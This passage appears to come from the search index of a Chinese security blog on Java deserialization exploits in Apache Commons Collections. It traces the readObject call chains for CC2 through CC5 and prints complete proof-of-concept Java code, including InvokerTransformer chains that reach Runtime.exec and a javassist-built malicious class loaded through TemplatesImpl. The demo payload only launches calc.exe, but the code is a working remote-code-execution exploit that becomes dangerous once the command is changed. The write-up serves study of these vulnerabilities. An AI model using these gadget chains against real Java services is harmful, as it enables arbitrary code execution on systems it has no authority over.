Transformer [] fakeTransformers = new Transformer [] { new ConstantTransformer ( 0 )}; Transformer [] transformers = new Transformer [] { new ConstantTransformer ( Runtime . class ), new InvokerTransformer ( \"getMethod\" , new Class [] { String . class , Class [] . class }, new Object [] { \"getRuntime\" , new Class [ 0 ] }), new InvokerTransformer ( \"invoke\" , new Class [] { Object . class , Object [] . class }, new Object [] { null , new Object [ 0 ] }), new InvokerTransformer ( \"exec\" , new Class [] { String . class }, new Object [] { \"calc.exe\" }), new ConstantTransformer ( 1 ), }; Transformer transformerChain = new ChainedTransformer ( fakeTransformers ); Map innerMap1 = new HashMap (); Map innerMap2 = new HashMap (); Map lazyMap1 = LazyMap . decorate ( innerMap1 , transformerChain ); lazyMap1 . put ( \"yy\" , 2 ); Map lazyMap2 = LazyMap . decorate ( innerMap2 , transformerChain ); lazyMap2 . put ( \"zZ\" , 2 ); Hashtable hashtable = new Hashtable (); hashtable . put ( lazyMap1 , 1 ); hashtable . put ( lazyMap2 , 1 ); lazyMap2 . remove ( \"yy\" ); Field f = ChainedTransformer . class . getDeclaredField ( \"iTransformers\" ); f . setAccessible ( true ); f . set ( transformerChain , transformers ); ByteArrayOutputStream barr = new ByteArrayOutputStream (); ObjectOutputStream oos = new ObjectOutputStream ( barr ); oos . writeObject ( hashtable ); oos . close (); System . out . println ( barr ); ObjectInputStream ois = new ObjectInputStream ( new ByteArrayInputStream ( barr . toByteArray ())); ois . readObject (); } } \u8c03\u7528\u903b\u8f91 # \u6574\u6761\u94fe\u7684\u8c03\u7528\u903b\u8f91\u4e3a: Hashtable.readObject() Hashtable.reconstitutionPut() org.apache.commons.collections.map.AbstractMapDecorator.equals() === java.util.AbstractMap.equals() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() // \u83b7\u53d6Runtime.class InvokerTransformer.transform() // \u83b7\u53d6Runtime.getRuntime InvokerTransformer.transform() // \u83b7\u53d6Runtime\u5b9e\u4f8b InvokerTransformer.transform() // \u8c03\u7528exec\u65b9\u6cd5\u89e6\u53d1rce","title":"\u53cd\u5e8f\u5217\u5316CC\u7bc7\u8865\u5145"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E7%AF%87%E8%A1%A5%E5%85%85/#\u53cd\u5e8f\u5217\u5316cc\u7bc7\u8865\u5145","text":"","title":"\u53cd\u5e8f\u5217\u5316CC\u7bc7\u8865\u5145"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E7%AF%87%E8%A1%A5%E5%85%85/#cc2","text":"","title":"CC2"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E7%AF%87%E8%A1%A5%E5%85%85/#\u5165\u53e3","text":"\u9996\u5148\uff0cCC2\u7684\u4f7f\u7528\u6761\u4ef6\u662fcommons-collections4.x\u7248\u672c\uff0c\u4e3a\u4ec0\u4e48\u4e0d\u80fd\u75283.x\u7248\u672c\u5462\uff1f\u56e0\u4e3a TransformingComparator \u7c7b\u57283.x\u7248\u672c\u4e2d\u6ca1\u6709\u5b9e\u73b0 Serializable \u63a5\u53e3\uff0c\u65e0\u6cd5\u88ab\u5e8f\u5217\u5316\u3002 \u6240\u4ee5\u6211\u4eec\u5148\u5728pom.xml\u4e2d\u6dfb\u52a0\u4ee5\u4e0b\u4f9d\u8d56: <dependency> <groupId> org.apache.commons </groupId> <artifactId> commons-collections4 </artifactId> <version> 4.0 </version> </dependency> CC2\u7684\u5165\u53e3\u4f7f\u7528\u4e86 PriorityQueue \u548c TransformingComparator \uff0c\u5176readObject\u65b9\u6cd5\u4f1a\u6700\u7ec8\u8c03\u7528\u5230 comparer.comare \uff0c\u800c TransformingComparator \u7684 compare \u65b9\u6cd5\u5219\u4f1a\u8c03\u7528 this.transformer.transform \u65b9\u6cd5\uff0c\u4ece\u800c\u62fc\u63a5\u4e0a\u94fe\u7684\u540e\u534a\u90e8\u5206\u3002","title":"\u5165\u53e3"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E7%AF%87%E8%A1%A5%E5%85%85/#priorityqueue\u5173\u952e\u4ee3\u7801","text":"\u8c03\u7528\u94fe\u4e3a PriorityQueue.readObject() -> PriorityQueue.heapify() -> PriorityQueue.siftDown() -> PriorityQueue.siftDownUsingComparator() -> comparator.compare() : public class PriorityQueue < E > extends AbstractQueue < E > implements java . io . Serializable { // ... private void readObject ( java . io . ObjectInputStream s ) throws java . io . IOException , ClassNotFoundException { // Read in size, and any hidden stuff s . defaultReadObject (); // Read in (and discard) array length s . readInt (); SharedSecrets . getJavaOISAccess (). checkArray ( s , Object [] . class , size ); queue = new Object [ size ] ; // Read in all elements. for ( int i = 0 ; i < size ; i ++ ) queue [ i ] = s . readObject (); // Elements are guaranteed to be in \"proper order\", but the // spec has never explained what that might be. heapify (); } private void heapify () { for ( int i = ( size >>> 1 ) - 1 ; i >= 0 ; i -- ) siftDown ( i , ( E ) queue [ i ] ); } private void siftDown ( int k , E x ) { if ( comparator != null ) siftDownUsingComparator ( k , x ); else siftDownComparable ( k , x ); } private void siftDownUsingComparator ( int k , E x ) { int half = size >>> 1 ; while ( k < half ) { int child = ( k << 1 ) + 1 ; Object c = queue [ child ] ; int right = child + 1 ; if ( right < size && comparator . compare (( E ) c , ( E ) queue [ right ] ) > 0 ) c = queue [ child = right ] ; if ( comparator . compare ( x , ( E ) c ) <= 0 ) break ; queue [ k ] = c ; k = child ; } queue [ k ] = x ; } // ... }","title":"PriorityQueue\u5173\u952e\u4ee3\u7801"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E7%AF%87%E8%A1%A5%E5%85%85/#transformingcomparator\u5173\u952e\u4ee3\u7801","text":"public class TransformingComparator < I , O > implements Comparator < I > , Serializable { public int compare ( I obj1 , I obj2 ) { O value1 = this . transformer . transform ( obj1 ); O value2 = this . transformer . transform ( obj2 ); return this . decorated . compare ( value1 , value2 ); } }","title":"TransformingComparator\u5173\u952e\u4ee3\u7801"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E7%AF%87%E8%A1%A5%E5%85%85/#\u521d\u59cb\u7248\u672c\u7684poc","text":"","title":"\u521d\u59cb\u7248\u672c\u7684poc"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E7%AF%87%E8%A1%A5%E5%85%85/#poc","text":"poc\u5982\u4e0b: import org.apache.commons.collections4.Transformer ; import org.apache.commons.collections4.comparators.TransformingComparator ; import org.apache.commons.collections4.functors.ChainedTransformer ; import org.apache.commons.collections4.functors.ConstantTransformer ; import org.apache.commons.collections4.functors.InvokerTransformer ; import org.apache.commons.collections4.keyvalue.TiedMapEntry ; import org.apache.commons.collections4.map.LazyMap ; import javax.management.BadAttributeValueExpException ; import java.io.ByteArrayInputStream ; import java.io.ByteArrayOutputStream ; import java.io.ObjectInputStream ; import java.io.ObjectOutputStream ; import java.lang.reflect.Field ; import java.util.HashMap ; import java.util.Map ; import java.util.PriorityQueue ; public class CC2 { public static void main ( String [] args ) throws Exception { Transformer [] fakeTransformers = new Transformer [] { new ConstantTransformer ( 1 )}; Transformer [] transformers = new Transformer [] { new ConstantTransformer ( Runtime . class ), new InvokerTransformer ( \"getMethod\" , new Class [] { String . class , Class [] . class }, new Object [] { \"getRuntime\" , new Class [ 0 ] }), new InvokerTransformer ( \"invoke\" , new Class [] { Object . class , Object [] . class }, new Object [] { null , new Object [ 0 ] }), new InvokerTransformer ( \"exec\" , new Class [] { String . class }, new Object [] { \"calc.exe\" }), new ConstantTransformer ( 1 ), }; // \u5148\u4f7f\u7528fakeTransformer\u9632\u6b62\u672c\u5730\u547d\u4ee4\u6267\u884c Transformer transformerChain = new ChainedTransformer ( fakeTransformers ); TransformingComparator comparator = new TransformingComparator ( transformerChain ); PriorityQueue queue = new PriorityQueue ( 1 ); queue . add ( 1 ); queue . add ( 2 ); // \u4f7f\u7528\u53cd\u5c04\u66ff\u6362transformerChain\u7684transformers Field f = ChainedTransformer . class . getDeclaredField ( \"iTransformers\" ); f . setAccessible ( true ); f . set ( transformerChain , transformers ); // \u4f7f\u7528\u53cd\u5c04\u66ff\u6362TransformingComparator\u7684comparator f = Class . forName ( \"java.util.PriorityQueue\" ). getDeclaredField ( \"comparator\" ); f . setAccessible ( true ); f . set ( queue , comparator ); ByteArrayOutputStream barr = new ByteArrayOutputStream (); ObjectOutputStream oos = new ObjectOutputStream ( barr ); oos . writeObject ( queue ); oos . close (); System . out . println ( barr ); ObjectInputStream ois = new ObjectInputStream ( new ByteArrayInputStream ( barr . toByteArray ())); Object o = ( Object ) ois . readObject (); } } \u8fd9\u4e2apoc\u6709\u51e0\u4e2a\u9700\u8981\u6ce8\u610f\u7684\u70b9: 1. \u9700\u8981\u5f80queue\u91ccadd\u4e24\u4e2a\u503c\u8fdb\u53bb\uff0c\u8fd9\u662f\u4e3a\u4e86\u5176size\u80fd\u5927\u4e8e1\uff0c\u80fd\u8fdb\u5165heapify\u4e2dfor\u5faa\u73af\u7684\u903b\u8f91 2. \u9700\u8981\u5728add\u503c\u4e4b\u540e\u624d\u901a\u8fc7\u53cd\u5c04\u8bbe\u7f6ecomparator\uff0c\u8fd9\u662f\u56e0\u4e3aadd\u5b58\u5728\u4ee5\u4e0b\u8c03\u7528\u94fe: PriorityQueue.add() -> PriorityQueue.offer() -> PriorityQueue.siftUp() -> siftUpUsingComparator() -> comparator.compare() \uff0c\u8fd9\u4f1a\u5bfc\u81f4\u6211\u4eec\u7684\u94fe\u63d0\u524d\u89e6\u53d1\uff0c\u800c\u4e14\u4f1a\u4ea7\u751f\u62a5\u9519(\u8fd9\u91cc\u53c2\u8003\u4e86 https://paper.seebug.org/1242/#commonscollections-2 \u8fd9\u7bc7\u6587\u7ae0\uff0c\u4f46\u662f\u7ecf\u8fc7\u6d4b\u8bd5\u63d0\u524d\u8bbe\u7f6e\u5e76\u4e0d\u4f1a\u51fa\u9519)","title":"poc"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E7%AF%87%E8%A1%A5%E5%85%85/#\u8c03\u7528\u903b\u8f91","text":"\u6574\u6761\u94fe\u7684\u8c03\u7528\u903b\u8f91\u4e3a: PriorityQueue.readObject() PriorityQueue.heapify() PriorityQueue.siftDown() PriorityQueue.siftDownUsingComparator() comparator.compare() === TransformingComparator.compare() ChainedTransformer.transform() ConstantTransformer.transform() // \u83b7\u53d6Runtime.class InvokerTransformer.transform() // \u83b7\u53d6Runtime.getRuntime InvokerTransformer.transform() // \u83b7\u53d6Runtime\u5b9e\u4f8b InvokerTransformer.transform() // \u8c03\u7528exec\u65b9\u6cd5\u89e6\u53d1rce","title":"\u8c03\u7528\u903b\u8f91"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E7%AF%87%E8%A1%A5%E5%85%85/#\u53e6\u5916\u4e00\u4e2a\u7248\u672c\u7684poc","text":"\u53e6\u5916\u4e00\u4e2a\u7248\u672c\u7684poc\u7684\u7ec8\u70b9\u4e0d\u518d\u662f\u6211\u4eec\u719f\u6089\u7684 ChainedTransformer \u90a3\u4e00\u5957\u56de\u8c03\u9020\u6210\u7684\u547d\u4ee4\u6267\u884c\uff0c\u800c\u662f\u53ef\u4ee5\u9020\u6210\u4efb\u610fjava\u4ee3\u7801\u6267\u884c\u7684 TemplatesImpl : \u8ddf\u8fdb getTransletInstance : \u518d\u8ddf\u8fdb defineTransletClasses : \u8fd9\u91cc\u901a\u8fc7loader.defineClass\u5c06bytecodes\u8fd8\u539f\u4e3aClass\uff0c\u63a5\u7740\u5728\u5916\u9762\u53c8\u8c03\u7528\u4e86 _class[_transletIndex].newInstance \u65b9\u6cd5\u5b9e\u4f8b\u5316\u8fd8\u539f\u7684Class\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u4e00\u4e2a\u6076\u610f\u7c7b\u5b57\u8282\u7801\uff0c\u5176\u5177\u6709\u6076\u610f\u7684static\u8bed\u53e5\u5757\uff0c\u5bfc\u81f4\u4efb\u610fjava\u4ee3\u7801\u6267\u884c\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 TemplatesImpl.newTransformer \u65b9\u6cd5\u6765\u6267\u884c\u6076\u610f\u7c7b\u7684static\u8bed\u53e5\u5757\u3002 \u8fd9\u91cc\u6211\u4eec\u5c31\u9700\u8981\u989d\u5916\u4e86\u89e3\u4e00\u4e9b\u77e5\u8bc6\uff0c\u9700\u8981\u4e86\u89e3javassit\u8fd9\u4e2a\u5e93\uff0c\u8fd9\u662f\u4e00\u4e2a\u7528\u6765\u5904\u7406Java \u5b57\u8282\u7801\u7684\u7c7b\u5e93\uff0c\u6211\u4eec\u9700\u8981\u7b80\u5355\u5b66\u4e60\u5b83\u7684\u4f7f\u7528\u3002","title":"\u53e6\u5916\u4e00\u4e2a\u7248\u672c\u7684poc"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E7%AF%87%E8%A1%A5%E5%85%85/#javassit","text":"","title":"javassit"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E7%AF%87%E8%A1%A5%E5%85%85/#maven\u4f9d\u8d56","text":"<dependency> <groupId> org.javassist </groupId> <artifactId> javassist </artifactId> <version> 3.25.0-GA </version> </dependency>","title":"maven\u4f9d\u8d56"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E7%AF%87%E8%A1%A5%E5%85%85/#\u7b80\u5355\u4f7f\u7528","text":"\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2a\u4ee3\u7801\u6765\u5b9e\u73b0\u751f\u6210java\u5b57\u8282\u7801: import javassist.* ; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl ; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet ; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl ; public class javassit_test { public static void createPseson () throws Exception { ClassPool pool = ClassPool . getDefault (); CtClass cc = pool . makeClass ( \"Cat\" ); String cmd = \"Runtime.getRuntime().exec(\\\"calc.exe\\\");\" ; // \u521b\u5efa static \u4ee3\u7801\u5757\uff0c\u5e76\u63d2\u5165\u4ee3\u7801 cc . makeClassInitializer (). insertBefore ( cmd ); String randomClassName = \"EvilCat\" + System . nanoTime (); cc . setName ( randomClassName ); // \u751f\u6210bytes\u5b57\u8282\u7801\uff0c\u7b49\u4e0b\u8981\u7528\u5230 //byte[] classBytes = cc.toBytecode(); // \u5199\u5165.class \u6587\u4ef6 cc . writeFile ( \"./\" ); } public static void main ( String [] args ) { try { createPseson (); } catch ( Exception e ) { e . printStackTrace (); } } } \u751f\u6210\u7684\u4ee3\u7801\u5927\u6982\u5982\u4e0b: import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet ; public class EvilCat32193904579700 extends AbstractTranslet { static { Runtime . getRuntime (). exec ( \"calc.exe\" ); } public EvilCat32193904579700 () { } }","title":"\u7b80\u5355\u4f7f\u7528"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E7%AF%87%E8%A1%A5%E5%85%85/#poc_1","text":"\u4e86\u89e3\u4e86javassit\u77e5\u8bc6\u4e4b\u540e\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u6784\u5efa\u6211\u4eec\u6700\u540e\u7684poc\u4e86: import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet ; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl ; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl ; import javassist.ClassClassPath ; import javassist.ClassPool ; import javassist.CtClass ; import org.apache.commons.collections4.Transformer ; import org.apache.commons.collections4.functors.InvokerTransformer ; import org.apache.commons.collections4.comparators.TransformingComparator ; import java.io.ByteArrayInputStream ; import java.io.ByteArrayOutputStream ; import java.io.ObjectInputStream ; import java.io.ObjectOutputStream ; import java.lang.reflect.Field ; import java.util.Arrays ; import java.util.PriorityQueue ; public class CC2 { public static TemplatesImpl generateEvilTemplates () throws Exception { ClassPool pool = ClassPool . getDefault (); pool . insertClassPath ( new ClassClassPath ( AbstractTranslet . class )); CtClass cc = pool . makeClass ( \"Cat\" ); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\");\" ; // \u521b\u5efa static \u4ee3\u7801\u5757\uff0c\u5e76\u63d2\u5165\u4ee3\u7801 cc . makeClassInitializer (). insertBefore ( cmd ); String randomClassName = \"EvilCat\" + System . nanoTime (); cc . setName ( randomClassName ); cc . setSuperclass ( pool . get ( AbstractTranslet . class . getName ())); // \u8f6c\u6362\u4e3abytes byte [] classBytes = cc . toBytecode (); byte [][] targetByteCodes = new byte [][] { classBytes }; TemplatesImpl templates = TemplatesImpl . class . newInstance (); setFieldValue ( templates , \"_bytecodes\" , targetByteCodes ); // \u8fdb\u5165 defineTransletClasses() \u65b9\u6cd5\u9700\u8981\u7684\u6761\u4ef6 setFieldValue ( templates , \"_name\" , \"name\" + System . nanoTime ()); setFieldValue ( templates , \"_class\" , null ); setFieldValue ( templates , \"_tfactory\" , new TransformerFactoryImpl ()); return templates ; } public static void main ( String [] args ) throws Exception { Transformer transformer = new InvokerTransformer ( \"newTransformer\" , null , null ); TransformingComparator comparator = new TransformingComparator ( transformer ); PriorityQueue queue = new PriorityQueue ( 2 ); TemplatesImpl templates = generateEvilTemplates (); setFieldValue ( queue , \"queue\" , new Object [] { templates , 1 }); setFieldValue ( queue , \"size\" , 2 ); setFieldValue ( queue , \"comparator\" , comparator ); //\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316 ByteArrayOutputStream barr = new ByteArrayOutputStream (); ObjectOutputStream oos = new ObjectOutputStream ( barr ); oos . writeObject ( queue ); oos . close (); System . out . println ( barr ); ObjectInputStream ois = new ObjectInputStream ( new ByteArrayInputStream ( barr . toByteArray ())); Object o = ( Object ) ois . readObject (); } public static void setFieldValue ( final Object obj , final String fieldName , final Object value ) throws Exception { final Field field = getField ( obj . getClass (), fieldName ); System . out . println ( field ); System . out . println ( value ); field . set ( obj , value ); } public static Field getField ( final Class <?> clazz , final String fieldName ) { Field field = null ; try { field = clazz . getDeclaredField ( fieldName ); field . setAccessible ( true ); } catch ( NoSuchFieldException ex ) { if ( clazz . getSuperclass () != null ) field = getField ( clazz . getSuperclass (), fieldName ); } return field ; } }","title":"poc"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E7%AF%87%E8%A1%A5%E5%85%85/#\u8c03\u7528\u903b\u8f91_1","text":"PriorityQueue.readObject() PriorityQueue.heapify() PriorityQueue.siftDown() PriorityQueue.siftDownUsingComparator() comparator.compare() === TransformingComparator.compare() InvokerTransformer.transform() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() // \u5b9a\u4e49\u7c7b ... // \u521b\u5efa\u7c7b\u5b9e\u4f8b\uff0c\u89e6\u53d1static\u4ee3\u7801\u5757","title":"\u8c03\u7528\u903b\u8f91"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E7%AF%87%E8%A1%A5%E5%85%85/#cc3","text":"CC1\u548cCC2\u7684\u6df7\u5408\u4f53\uff0cCC1\u7684\u524d\u6bb5\u548cCC2\u7684\u540e\u6bb5\uff0c\u7528\u5230\u4e86\u4e00\u4e2a\u65b0\u7684\u7c7b TrAXFilter \uff0c\u5176\u6784\u9020\u51fd\u6570\u4f1a\u8c03\u7528\u5176\u5c5e\u6027\u7684 newTransformer","title":"CC3"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E7%AF%87%E8%A1%A5%E5%85%85/#\u8c03\u7528\u903b\u8f91_2","text":"AnnotationInvocationHandler.readObject() Proxy.entrySet() // readObject\u8c03\u7528\u4e86proxy\u7684\u67d0\u4e9b\u65b9\u6cd5\uff0c\u56de\u8c03invoke Proxy.invoke() === AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() InvokerTransformer.transform() InstantiateTransformer.transform() newInstance() TrAXFilter#TrAXFilter() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() // \u5b9a\u4e49\u7c7b ... // \u521b\u5efa\u7c7b\u5b9e\u4f8b\uff0c\u89e6\u53d1static\u4ee3\u7801\u5757","title":"\u8c03\u7528\u903b\u8f91"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E7%AF%87%E8%A1%A5%E5%85%85/#cc4","text":"\u57fa\u672c\u4e0a\u662fCC2\uff0c\u53ea\u662f\u6362\u6210\u4e86\u7c7b TrAXFilter \uff0c\u5176\u7684\u6784\u9020\u51fd\u6570\u4f1a\u8c03\u7528\u5176\u5c5e\u6027\u7684 newTransformer","title":"CC4"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E7%AF%87%E8%A1%A5%E5%85%85/#\u8c03\u7528\u903b\u8f91_3","text":"PriorityQueue.readObject() PriorityQueue.heapify() PriorityQueue.siftDown() PriorityQueue.siftDownUsingComparator() comparator.compare() === TransformingComparator.compare() ChainedTransformer.transform() InvokerTransformer.transform() InstantiateTransformer.transform() newInstance() TrAXFilter#TrAXFilter() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() // \u5b9a\u4e49\u7c7b ... // \u521b\u5efa\u7c7b\u5b9e\u4f8b\uff0c\u89e6\u53d1static\u4ee3\u7801\u5757","title":"\u8c03\u7528\u903b\u8f91"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E7%AF%87%E8%A1%A5%E5%85%85/#cc5","text":"","title":"CC5"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E7%AF%87%E8%A1%A5%E5%85%85/#\u5165\u53e3_1","text":"CC5\u4e0eCC6\u975e\u5e38\u76f8\u4f3c\uff0c\u4e0d\u540c\u7684\u5730\u65b9\u662f\u901a\u8fc7 TiedMapEntry.toString \u65b9\u6cd5\u800c\u975e TiedMapEntry.hashCode \u65b9\u6cd5\u89e6\u53d1 TiedMapEntry.getValue \u4ece\u800c\u89e6\u53d1 LazyMap.get \u3002 public class TiedMapEntry implements Entry , KeyValue , Serializable { //... public String toString () { return this . getKey () + \"=\" + this . getValue (); } } \u540c\u6837\u7684\uff0c\u6211\u4eec\u9700\u8981\u627e\u5230\u4e00\u4e2a\u53cd\u5e8f\u5217\u5316\u7684\u5165\u53e3\uff0c\u5176 readObject \u4f1a\u89e6\u53d1\u5c5e\u6027\u7684 toString \u65b9\u6cd5\uff0c\u8fd9\u91cc\u7528\u5230\u7684\u662f BadAttributeValueExpException \u8fd9\u4e2a\u7c7b\uff0c\u5176\u7c7b\u7ed3\u6784\u5927\u81f4\u5982\u4e0b: public class BadAttributeValueExpException extends Exception { // ... public BadAttributeValueExpException ( Object val ) { this . val = val == null ? null : val . toString (); } public String toString () { return \"BadAttributeValueException: \" + val ; } private void readObject ( ObjectInputStream ois ) throws IOException , ClassNotFoundException { ObjectInputStream . GetField gf = ois . readFields (); Object valObj = gf . get ( \"val\" , null ); if ( valObj == null ) { val = null ; } else if ( valObj instanceof String ) { val = valObj ; } else if ( System . getSecurityManager () == null || valObj instanceof Long || valObj instanceof Integer || valObj instanceof Float || valObj instanceof Double || valObj instanceof Byte || valObj instanceof Short || valObj instanceof Boolean ) { val = valObj . toString (); } else { // the serialized object is from a version without JDK-8019292 fix val = System . identityHashCode ( valObj ) + \"@\" + valObj . getClass (). getName (); } } } \u53ef\u4ee5\u770b\u5230\u8fd9\u91cc\u53ea\u8981\u6ee1\u8db3\u6761\u4ef6\u5c31\u4f1a\u89e6\u53d1 valObj.toString() \u65b9\u6cd5\uff0c\u800c valObj \u5176\u5b9e\u5c31\u662f this.val \uff0c\u662f\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u7684\u3002","title":"\u5165\u53e3"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E7%AF%87%E8%A1%A5%E5%85%85/#\u6700\u7ec8poc","text":"\u6211\u4eec\u53ea\u9700\u8981\u5bf9CC6\u94fe\u7a0d\u4f5c\u4fee\u6539\u5373\u53ef\uff0c\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\u6211\u4eec\u540c\u6837\u4f7f\u7528\u53cd\u5c04\u6280\u672f\u4fee\u6539 BadAttributeValueExpException.val \uff0c\u5176\u539f\u56e0\u4e5f\u662f\u56e0\u4e3a\u5982\u679c\u6211\u4eec\u901a\u8fc7\u6784\u9020\u51fd\u6570\u76f4\u63a5\u8bbe\u7f6e\u4e3a TiedMapEntry \u7684\u8bdd\u4f1a\u9020\u6210\u672c\u5730\u547d\u4ee4\u6267\u884c: import org.apache.commons.collections.Transformer ; import org.apache.commons.collections.functors.ChainedTransformer ; import org.apache.commons.collections.functors.ConstantTransformer ; import org.apache.commons.collections.functors.InvokerTransformer ; import org.apache.commons.collections.keyvalue.TiedMapEntry ; import org.apache.commons.collections.map.LazyMap ; import javax.management.BadAttributeValueExpException ; import java.io.ByteArrayInputStream ; import java.io.ByteArrayOutputStream ; import java.io.ObjectInputStream ; import java.io.ObjectOutputStream ; import java.lang.reflect.Field ; import java.util.HashMap ; import java.util.Map ; public class CC5 { public static void main ( String [] args ) throws Exception { Transformer [] fakeTransformers = new Transformer [] { new ConstantTransformer ( 1 )}; Transformer [] transformers = new Transformer [] { new ConstantTransformer ( Runtime . class ), new InvokerTransformer ( \"getMethod\" , new Class [] { String . class , Class [] . class }, new Object [] { \"getRuntime\" , new Class [ 0 ] }), new InvokerTransformer ( \"invoke\" , new Class [] { Object . class , Object [] . class }, new Object [] { null , new Object [ 0 ] }), new InvokerTransformer ( \"exec\" , new Class [] { String . class }, new Object [] { \"calc.exe\" }), new ConstantTransformer ( 1 ), }; // \u5148\u4f7f\u7528fakeTransformer\u9632\u6b62\u672c\u5730\u547d\u4ee4\u6267\u884c Transformer transformerChain = new ChainedTransformer ( fakeTransformers ); Map innerMap = new HashMap (); Map outerMap = LazyMap . decorate ( innerMap , transformerChain ); TiedMapEntry tiedMapEntry = new TiedMapEntry ( outerMap , \"keykey\" ); BadAttributeValueExpException obj = new BadAttributeValueExpException ( 1 ); // \u4f7f\u7528\u53cd\u5c04\u66ff\u6362transformerChain\u7684transformers Field f = ChainedTransformer . class . getDeclaredField ( \"iTransformers\" ); f . setAccessible ( true ); f . set ( transformerChain , transformers ); // \u4f7f\u7528\u53cd\u5c04\u66ff\u6362BadAttributeValueExpException\u7684val f = BadAttributeValueExpException . class . getDeclaredField ( \"val\" ); f . setAccessible ( true ); f . set ( obj , tiedMapEntry ); ByteArrayOutputStream barr = new ByteArrayOutputStream (); ObjectOutputStream oos = new ObjectOutputStream ( barr ); oos . writeObject ( obj ); oos . close (); System . out . println ( barr ); ObjectInputStream ois = new ObjectInputStream ( new ByteArrayInputStream ( barr . toByteArray ())); Object o = ( Object ) ois . readObject (); } 